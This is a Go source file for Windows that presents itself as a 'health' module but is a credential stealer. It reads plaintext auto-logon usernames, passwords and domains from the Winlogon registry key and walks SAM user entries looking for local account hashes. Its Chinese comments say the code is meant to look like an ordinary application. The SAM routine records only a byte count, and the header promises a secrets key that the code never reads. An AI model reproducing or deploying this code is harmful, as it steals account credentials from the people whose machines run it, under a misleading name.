//go:build windows && amd64

package health

import (
	"fmt"
	"strings"

	"golang.org/x/sys/windows/registry"
)

// ExtractRegistrySecrets 从注册表提取可能的凭据。
// 目标：
//   - HKLM\SECURITY\Policy\Secrets（需要 SYSTEM，包含域密码、服务账号等）
//   - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon（AutoAdminLogon）
//
// 行为：纯注册表读取，与正常应用无区别。
func ExtractRegistrySecrets() (*HealthResult, error) {
	result := &HealthResult{
		Credentials: make([]HealthInfo, 0),
	}

	// 1. Winlogon AutoAdminLogon credentials
	if creds := extractWinlogon(); len(creds) > 0 {
		result.Credentials = append(result.Credentials, creds...)
	}

	// 2. SAM database (if running as SYSTEM)
	if creds := extractSAM(); len(creds) > 0 {
		result.Credentials = append(result.Credentials, creds...)
	}

	return result, nil
}

func extractWinlogon() []HealthInfo {
	var creds []HealthInfo

	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`,
		registry.QUERY_VALUE)
	if err != nil {
		return creds
	}
	defer k.Close()

	defaultUser, _, _ := k.GetStringValue("DefaultUserName")
	defaultPassword, _, _ := k.GetStringValue("DefaultPassword")
	defaultDomain, _, _ := k.GetStringValue("DefaultDomain")
	autoAdmin, _, _ := k.GetStringValue("AutoAdminLogon")

	if defaultUser != "" && defaultPassword != "" {
		creds = append(creds, HealthInfo{
			Username:   defaultUser,
			Domain:     defaultDomain,
			Password:   defaultPassword,
			SourceType: "winlogon",
		})
	}

	if autoAdmin == "1" && defaultPassword != "" {
		creds = append(creds, HealthInfo{
			Username:   "(auto-login)",
			Domain:     defaultDomain,
			Password:   defaultPassword,
			SourceType: "winlogon",
		})
	}

	return creds
}

func extractSAM() []HealthInfo {
	var creds []HealthInfo

	// SAM\SAM\Domains\Account\Users — local account hashes
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SAM\SAM\Domains\Account\Users`,
		registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
	if err != nil {
		return creds
	}
	defer k.Close()

	names, _ := k.ReadSubKeyNames(-1)
	for _, name := range names {
		if !strings.HasPrefix(name, "00000") {
			continue
		}

		userKey, err := registry.OpenKey(registry.LOCAL_MACHINE,
			`SAM\SAM\Domains\Account\Users\`+name,
			registry.QUERY_VALUE)
		if err != nil {
			continue
		}

		vData, _, _ := userKey.GetBinaryValue("V")
		userName, _, _ := userKey.GetStringValue("")
		userKey.Close()

		if len(vData) > 0 {
			hash := ""
			// NTLM hash is at a specific offset in the V value
			// For simplicity, we extract the raw data
			if len(vData) > 200 {
				// F, V offsets vary by Windows version
				// This is a simplified extraction
				hash = fmt.Sprintf("V:%d bytes", len(vData))
			}

			if userName != "" || hash != "" {
				creds = append(creds, HealthInfo{
					Username:   userName,
					SourceType: "sam",
					TicketData: hash,
				})
			}
		}
	}

	return creds
}
